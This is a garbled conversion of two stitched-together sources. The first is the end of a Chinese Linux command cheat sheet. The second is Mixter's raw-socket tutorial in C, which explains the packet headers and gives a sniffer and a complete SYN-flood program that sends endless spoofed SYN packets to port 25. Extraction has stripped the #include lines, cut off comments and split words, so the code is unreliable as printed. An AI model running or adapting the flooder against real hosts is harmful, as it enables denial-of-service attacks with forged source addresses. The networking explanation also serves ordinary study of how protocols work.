</td></tr><tr style="height:18pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    [Linux Command Line written by ](http://www.linuxguide.it/commands)[LinuxGuide.it](http://www.linuxguide.it/commands)<span style=" color: #00F; font-family:Calibri, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt;"> </span>(<span class="s55">Credits</span>)
</td></tr></table><table style="border-collapse:collapse;margin-left:10.885pt" cellspacing="0"><tr style="height:21pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    <a name="bookmark61">其他有用的</a>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#505050;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    命令
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    说明
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # alias hh=&#39;history&#39;
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    为命令 <span class="s52">history(</span>历史<span class="s52">)</span>设置一个别名
</td></tr><tr style="height:52pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # apropos ...keyword
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    罗列一个包括程序关键词的命令列表，当

你仅知晓程序是干什么，而又记不得命令时特别有用
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # chsh
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    改变 <span class="s52">shell </span>命令
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # chsh --list-shells
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    用于了解你是否必须远程连接到别的机器的不错的命令
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # gpg -c file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    用 <span class="s52">GNU Privacy Guard </span>加密一个文件
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # gpg file1.gpg
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    用 <span class="s52">GNU Privacy Guard </span>解密一个文件
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # ldd /usr/bin/ssh
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示 <span class="s52">ssh </span>程序所依赖的共享库
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # man ping
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    罗列在线手册页（例如 <span class="s52">ping </span>命令）
</td></tr><tr style="height:34pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # mkbootdisk --device /dev/fd0 `uname - r`
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    创建一个引导软盘
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    [# wget -r www.example.com](http://www.example.com/)
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    下载一个完整的<span class="s52">web </span>站点
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    [# wget -c www.example.com/file.iso](http://www.example.com/file.iso)
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    以支持断点续传的方式下载一个文件
</td></tr><tr style="height:34pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    [# echo &#39;wget -c](http://www.example.com/files.iso%27) www.example.com/files.iso&#39; | at 09:00
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    在任何给定的时间开始一次下载
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # whatis ...keyword
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    罗列该程序功能的说明
</td></tr><tr style="height:68pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # who -a
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示谁正登录在线，并打印出：系统最后引导的时间，关机进程，系统登录进程以及由 <span class="s52">init </span>启动的进程，当前运行级和最后一次系统时钟的变化
</td></tr><tr style="height:18pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    [Linux Command Line written by ](http://www.linuxguide.it/commands)[LinuxGuide.it](http://www.linuxguide.it/commands)<span style=" color: #00F; font-family:Calibri, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt;"> </span>(<span class="s55">Credits</span>)
</td></tr></table>

    [A brief programming tutorial in C for raw sockets                                                http://mixter.void.ru/rawip.html](http://mixter.void.ru/rawip.html)

#### A brief programming tutorial in C for raw sockets

<span style=" color: #000;">by </span><u>Mixter</u> [for the BlackC ode Magazine ](http://mixter.void.ru/)[http://mixter.void.ru](http://mixter.void.ru/) [or ](http://mixter.warrior2k.com/)[http://mixter.warrior2k.com](http://mixter.warrior2k.com/)

    1.  Raw sockets

        2.  The protocols IP, IC<span class="s63"> </span>MP, TC<span class="s63"> </span>P and UDP

        3.  Building and injecting datagrams

        4.  Basic transport layer operations

[In this tutorial, you&#39;ll learn the basics of using raw sockets in C , to insert any IP protocol based datagram into the network traffic. This is useful,for example, to build raw socket scanners like nmap, to spoof or to perform operations that need to send out raw sockets. Basically, you can send any packet at any time, whereas using the interface functions for your systems IP-stack (connect, write, bind, etc.) you have no direct control over the packets. This theoretically enables you to simulate the behavior of your OS&#39;s IP stack, and also to send stateless traffic (datagrams that don&#39;t belong to a valid connection). For this tutorial, all you need is a minimal knowledge of socket programming in C (see ](http://www.ecst.csuchico.edu/%7Ebeej/guide/net/))[http://www.ecst.csuchico.edu/~beej/guide/net/](http://www.ecst.csuchico.edu/%7Ebeej/guide/net/))[).](http://www.ecst.csuchico.edu/%7Ebeej/guide/net/))

1.  Raw sockets

The basic concept of low level sockets is to send a single packet at one time, with all the protocol headers filled in by the program (instead of the kernel). Unix provides two kinds of sockets that permit direct access to the network. One is SOC K_PAC KET, which receives and sends data on the device link layer. This means, the NIC specific header is included in the data that will be written or read. For most networks, this is the ethernet header. Of course, all subsequent protocol headers will also be included in the data. The socket type we&#39;ll be using, however, is SOC K_RAW, which includes the IP headers and all subsequent protocol headers and data.

The (simplified) link layer model looks like this:

Physical layer -&gt; Device layer (Ethernet protocol) -&gt; Network layer (IP) -&gt; Transport layer (TC P, UDP, IC MP) -&gt; Session layer (application specific data)

Now to some practical stuff. A standard command to create a datagram socket is: socket (PF_INET, SOC K_RAW, IPPROTO_UDP); From the moment that it is created, you can send any IP packets over it, and receive any IP packets that the host received after that socket was created if you read() from it. Note that even though the socket is an interface to the IP header, it is transport layer specific. That means, for listening to TC P, UDP and IC MP traffic, you have to create 3 separate raw sockets, using IPPROTO_TC P, IPPROTO_UDP and IPPROTO_IC MP (the protocol numbers are 0 or 6 for tcp, 17 for udp and 1 for icmp).

With this knowledge, we can, for example, already create a small sniffer, that dumps out the contents of all tcp packets we receive. (Headers, etc. are missing, this is just an example. As you see, we are skipping the IP and TC P headers which are contained in the packet, and print out the payload, the data of the session/application layer, only).

int fd = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);

char buffer[8192]; /* single packets are usually not bigger than 8192 bytes */ while (read (fd, buffer, 8192) &gt; 0)

printf (&quot;Caught tcp packet: %s\n&quot;, buffer+sizeof(struct iphdr)+sizeof(struct tcphdr));

[A brief programming tutorial in C for raw sockets                                                http://mixter.void.ru/rawip.html](http://mixter.void.ru/rawip.html)

2.  The protocols IP, ICMP, TCP and UDP

To inject your own packets, all you need to know is the structures of the protocols that need to be included. Below you will find a short introduction to the IP, IC MP, TC P and UDP headers. It is recommended to build your packet by using a struct, so you can comfortably fill in the packet headers. Unix systems provide standard structures in the header files (eg. ). You can always create your own structs, as long as the length of each option is correct. To help you create portable programs, we&#39;ll use the BSD names in our structures. We&#39;ll also use the little endian notation. On big endian machines (some other processor architectures than intel x86), the 4

bit-size variables exchange places. However, one can always use the structures in the same ways in this program. Below each header structure is a short explanation of its members, so that you know what values should be filled in and which meaning they have.

The data types/sizes we need to use are: unsigned char - 1 byte (8 bits), unsigned short int - 2 bytes (16 bits) and unsigned int - 4 bytes (32 bits)

struct ipheader {

unsigned char ip_hl:4, ip_v:4; /* this means that each member is 4 bits */ unsigned char ip_tos;

unsigned short int ip_len; unsigned short int ip_id; unsigned short int ip_off; unsigned char ip_ttl; unsigned char ip_p; unsigned short int ip_sum; unsigned int ip_src; unsigned int ip_dst;

}; /* total ip header length: 20 bytes (=160 bits) */

The Internet Protocol is the network layer protocol, used for routing the data from the source to its destination. Every datagram contains an IP header followed by a transport layer protocol such as tcp.

ip_hl<span class="p">: the ip header length in 32bit octets. this means a value of 5 for the hl means 20 bytes (5</span>

    * 4). values other than 5 only need to be set it the ip header contains options (mostly used for routing)

ip_v <span class="p">: the ip version is always 4 (maybe I&#39;ll write a IPv6 tutorial later;)</span>

ip_tos<span class="p">: type of service controls the priority of the packet. 0x00 is normal. the first 3 bits stand for routing priority, the next 4 bits for the type of service (delay, throughput, reliability and cost).</span>

ip_len<span class="p">: total length must contain the total length of the ip datagram. this includes ip header, icmp or tcp or udp header and payload size in bytes.</span>

ip_id<span class="p">: the id sequence number is mainly used for reassembly of fragmented IP datagrams. when sending single datagrams, each can have an arbitrary ID.</span>

ip_off<span class="p">: the fragment offset is used for reassembly of fragmented datagrams. the first 3 bits are the fragment flags, the first one always 0, the second the do-not-fragment bit (set by ip_off</span>

|= 0x4000) and the third the more-flag or more-fragments-following bit (ip_off |= 0x2000). the following 13 bits is the fragment offset, containing the number of 8-byte big packets already sent.

ip_ttl<span class="p">: time to live is the amount of hops (routers to pass) before the packet is discarded, and an icmp error message is returned. the maximum is 255.</span>

ip_p<span class="p">: the transport layer protocol. can be tcp (6), udp(17), icmp(1), or whatever protocol follows the ip header. look in /etc/protocols for more.</span>

[A brief programming tutorial in C for raw sockets                                                http://mixter.void.ru/rawip.html](http://mixter.void.ru/rawip.html)

ip_sum<span class="p">: the datagram checksum for the whole ip datagram. every time anything in the datagram changes, it needs to be recalculated, or the packet will be discarded by the next router. see V. for a checksum function.</span>

ip_src <span class="p">and </span>ip_dst<span class="p">: source and destination IP address, converted to long format, e.g. by inet_addr(). both can be chosen arbitrarily.</span>

[A brief programming tutorial in C for raw sockets                                                http://mixter.void.ru/rawip.html](http://mixter.void.ru/rawip.html)

IP itself has no mechanism for establishing and maintaining a connection, or even containing data as a direct payload. Internet C ontrol Messaging Protocol is merely an addition to IP to carry error, routing and control messages and data, and is often considered as a protocol of the network layer.

struct icmpheader { unsigned char icmp_type; unsigned char icmp_code;

unsigned short int icmp_cksum;

/* The following data structures are ICMP type specific */ unsigned short int icmp_id;

unsigned short int icmp_seq;

}; /* total icmp header length: 8 bytes (=64 bits) */

icmp_type <span class="p">: the message type, for example 0 - echo reply, 8 - echo request, 3 - destination unreachable. look in for all the types.</span>

icmp_code <span class="p">: this is significant when sending an error message (unreach), and specifies the kind of error. again, consult the include file for more.</span>

icmp_cksum<span class="p">: the checksum for the icmp header + data. same as the IP checksum. Note: The next 32 bits in an icmp packet can be used in many different ways. This depends on the icmp type and code. the most commonly seen structure, an ID and sequence number, is used in echo requests and replies, hence we only use this one, but keep in mind that the header is actually more complex.</span>

icmp_id<span class="p">: used in echo request/reply messages, to identify the request</span>

icmp_seq<span class="p">: identifies the sequence of echo messages, if more than one is sent.</span>

The User Datagram Protocol is a transport protocol for sessions that need to exchange data. Both transport protocols, UDP and TC P provide 65535 different source and destination ports. The destination port is used to connect to a specific service on that port. Unlike TC P, UDP is not reliable, since it doesn&#39;t use sequence numbers and stateful connections. This means UDP datagrams can be spoofed, and might not be reliable (e.g. they can be lost unnoticed), since they are not acknowledged using replies and sequence numbers.

struct udpheader {

unsigned short int uh_sport; unsigned short int uh_dport; unsigned short int uh_len; unsigned short int uh_check;

}; /* total udp header length: 8 bytes (=64 bits) */

uh_sport: The source port that a client bind()s to, and the contacted server will reply back to in order to direct his responses to the client.

uh_dport: The destination port that a specific server can be contacted on. uh_len: The length of udp header and payload data in bytes.

uh_check: The checksum of header and data, see IP checksum.

The Transmission C ontrol Protocol is the mostly used transport protocol that provides mechanisms to establish a reliable connection with some basic authentication, using connection states and sequence numbers. (See <span class="s62">IV. Basic transport layer operations</span>.)

struct tcpheader {

unsigned short int th_sport; unsigned short int th_dport; unsigned int th_seq;

[A brief programming tutorial in C for raw sockets                                                http://mixter.void.ru/rawip.html](http://mixter.void.ru/rawip.html)

unsigned int th_ack;

unsigned char th_x2:4, th_off:4; unsigned char th_flags;

unsigned short int th_win; unsigned short int th_sum; unsigned short int th_urp;

}; /* total tcp header length: 20 bytes (=160 bits) */

[A brief programming tutorial in C for raw sockets                                                http://mixter.void.ru/rawip.html](http://mixter.void.ru/rawip.html)

th_sport: The source port, which has the same function as in UDP. th_dport: The destination port, which has the same function as in UDP.

th_seq: The sequence number is used to enumerate the TC P segments. The data in a TC P connection can be contained in any amount of segments (=single tcp datagrams), which will be put in order and acknowledged. For example, if you send 3 segments, each containing 32 bytes of data, the first sequence would be (N+)1, the second one (N+)33 and the third one (N+)65. &quot;N+&quot; because the initial sequence is random.

th_ack: Every packet that is sent and a valid part of a connection is acknowledged with an empty TC P segment with the AC K flag set (see below), and the th_ack field containing the previous the_seq number.

th_x2: This is unused and contains binary zeroes.

th_off: The segment offset specifies the length of the TC P header in 32bit/4byte blocks. Without tcp header options, the value is 5.

th_flags: This field consists of six binary flags. Using bsd headers, they can be combined like this: th_flags = FLAG1 | FLAG2 | FLAG3...

TH_URG: Urgent. Segment will be routed faster, used for termination of a connection or to stop processes (using telnet protocol).

TH_AC K: Acknowledgement. Used to acknowledge data and in the second and third stage of a TC P connection initiation (see IV.).

TH_PSH: Push. The systems IP stack will not buffer the segment and forward it to the application immediately (mostly used with telnet).

TH_RST: Reset. Tells the peer that the connection has been terminated.

TH_SYN: Synchronization. A segment with the SYN flag set indicates that client wants to initiate a new connection to the destination port.

TH_FIN: Final. The connection should be closed, the peer is supposed to answer with one last segment with the FIN flag set as well.

th_win: Window. The amount of bytes that can be sent before the data should be acknowledged with an AC K before sending more segments.

th_sum: The checksum of pseudo header, tcp header and payload. The pseudo is a structure containing IP source and destination address, 1 byte set to zero, the protocol (1 byte with a decimal value of 6), and 2 bytes (unsigned short) containing the total length of the tcp segment. th_urp: Urgent pointer. Only used if the urgent flag is set, else zero. It points to the end of the payload data that should be sent with priority.

3.  Building and injecting datagrams

Now, by putting together the knowledge about the protocol header structures with some basic C functions, it is easy to construct and send any datagram(s). We will demonstrate this with a small sample program that constantly sends out SYN requests to one host (Syn flooder).

#define __USE_BSD /* use bsd&#39;ish ip header */

#include /* these headers are for a Linux system, but */ #include /* the names on other systems are easy to guess.. */ #include

#define #include #include

__FAVOR_BSD /* use bsd&#39;ish tcp header */

#define P 25  /* lets flood the sendmail port */

unsigned short /* this function generates header checksums */ csum (unsigned short *buf, int nwords)

[A brief programming tutorial in C for raw sockets                                                http://mixter.void.ru/rawip.html](http://mixter.void.ru/rawip.html)

{

unsigned long sum;

for (sum = 0; nwords &gt; 0; nwords--) sum += *buf++;

sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff); sum += (sum &gt;&gt; 16);

return ~sum;

}

[A brief programming tutorial in C for raw sockets                                                http://mixter.void.ru/rawip.html](http://mixter.void.ru/rawip.html)

int

main (void)

{

int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP); /* open raw socket */ char datagram[4096]; /* this buffer will contain ip header, tcp header,

and payload. we&#39;ll point an ip header structure

at its beginning, and a tcp header structure after that to write the header values into it */

struct ip *iph = (struct ip *) datagram;

struct tcphdr *tcph = (struct tcphdr *) datagram + sizeof (struct ip); struct sockaddr_in sin;

/* the sockaddr_in containing the dest. address is used in sendto() to determine the datagrams path */

sin.sin_family = AF_INET;

sin.sin_port = htons (P);/* you byte-order &gt;1byte header values to network

byte order (not needed on big endian machines) */ sin.sin_addr.s_addr = inet_addr (&quot;127.0.0.1&quot;);

memset (datagram, 0, 4096); /* zero out the buffer */

/* we&#39;ll now fill in the ip/tcp header values, see above for explanations */ iph-&gt;ip_hl = 5;

iph-&gt;ip_v = 4;

iph-&gt;ip_tos = 0;

iph-&gt;ip_len = sizeof (struct ip) + sizeof (struct tcphdr); /* no payload * iph-&gt;ip_id = htonl (54321); /* the value doesn&#39;t matter here */

iph-&gt;ip_off = 0;

iph-&gt;ip_ttl = 255;

iph-&gt;ip_p = 6;

iph-&gt;ip_sum = 0; /* set it to 0 before computing the actual chec iph-&gt;ip_src.s_addr = inet_addr (&quot;1.2.3.4&quot;);/* SYN&#39;s can be blindly spoofed */ iph-&gt;ip_dst.s_addr = sin.sin_addr.s_addr;

tcph-&gt;th_sport = htons (1234); /* arbitrary port */ tcph-&gt;th_dport = htons (P);

tcph-&gt;th_seq = random ();/* in a SYN packet, the sequence is a random */ tcph-&gt;th_ack = 0;/* number, and the ack sequence is 0 in the 1st packet */ tcph-&gt;th_x2 = 0;

tcph-&gt;th_off = 0; /* first and only tcp segment */ tcph-&gt;th_flags = TH_SYN; /* initial connection request */ tcph-&gt;th_win = htonl (65535); /* maximum allowed window size */

tcph-&gt;th_sum = 0;/* if you set a checksum to zero, your kernel&#39;s IP stack should fill in the correct checksum during transmission *

tcph-&gt;th_urp = 0;

iph-&gt;ip_sum = csum ((unsigned short *) datagram, iph-&gt;ip_len &gt;&gt; 1);

/* finally, it is very advisable to do a IP_HDRINCL call, to make sure that the kernel knows the header is included in the data, and doesn&#39;t insert its own header into the packet before our data */

[A brief programming tutorial in C for raw sockets                                                http://mixter.void.ru/rawip.html](http://mixter.void.ru/rawip.html)

{ /* lets do it the ugly way.. */ int one = 1;

const int *val = &amp;one;

if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) &lt; 0) printf (&quot;Warning: Cannot set HDRINCL!\n&quot;);

}

[A brief programming tutorial in C for raw sockets                                                http://mixter.void.ru/rawip.html](http://mixter.void.ru/rawip.html)

while (1)

{

if (sendto (s, /* our socket */

datagram, /* the buffer containing headers and data */ iph-&gt;ip_len, /* total length of our datagram */

0,  /* routing flags, normally always 0 */

(struct sockaddr *) &amp;sin, /* socket addr, just like in */ sizeof (sin)) &lt; 0) /* a normal send() */

printf (&quot;error\n&quot;); else

printf (&quot;.&quot;);

}

return 0;

}

4.  Basic transport layer operations

To make use of raw packets, knowledge of the basic IP stack operations is essential. I&#39;ll try to give a brief introduction into the most important operations in the IP stack. To learn more about the behavior of the protocols, one option is to exame the source for your systems IP stack, which, in Linux, is located in the directory /usr/src/linux/net/ipv4/.  The most important protocol, of course, is TC P, on which I will focus on.

C onnection initiation: to contact an udp or tcp server listening on port 1234, the client calls a connect() with the sockaddr structure containing destination address and port. If the client did not bind() to a source port, the systems IP stack will select one it&#39;ll bind to. By connect()ing, the host sends a datagram containing the following information: IP src: client address, IP dest: servers address, TC P/UDP src: clients source port, TC P/UDP dest: port 1234. If a client is located on port 1234 on the destination host, it will reply back with a datagram containing: IP src: server IP dst: client srcport: server port dstport: clients source port. If there is no server located on the host, an IC MP type unreach message is created, subcode &quot;C onnection refused&quot;. The client will then terminate. If the destination host is down, either a router will create a different IC MP unreach message, or the client gets no reply and the connection times out.

TC P initiation (&quot;3-way handshake&quot;) and connection: The client will do a connection initiation, with the tcp SYN flag set, an arbitrary sequence number, and no acknowledgement number. The server acknowledges the SYN by sending a packet with SYN and AC K set, another random sequence number and the acknowledgement number the original sequence. Finally, the client replies back with a tcp datagram with the AC K flag set, and the server&#39;s ack sequence incremented by one. Once the connection is established, each tcp segment will be sent with no flags (PSH and URG are optional), the sequence number for each packet incremented by the size of the previous tcp segment. After the amount of data specified as &quot;window size&quot; has been transferred, the peer sending data will wait for an acknowledgement, a tcp segment with the AC K flag set and the ack sequence number the one of the last data packet that could be received in order. That way, if any segments get lost, they will not be acknowledged and can be retransmitted. To end a connection, both server and client send a tcp packet with correct sequence numbers and the FIN flag set, and if the connection ever de-synchronizes (aborted, desynchronized, bad sequence numbers, etc.) the peer that notices the error will send a RST packet with correct seq numbers to terminate the connection.

[A brief programming tutorial in C for raw sockets                                                http://mixter.void.ru/rawip.html](http://mixter.void.ru/rawip.html)

- Mixter
</body></html>
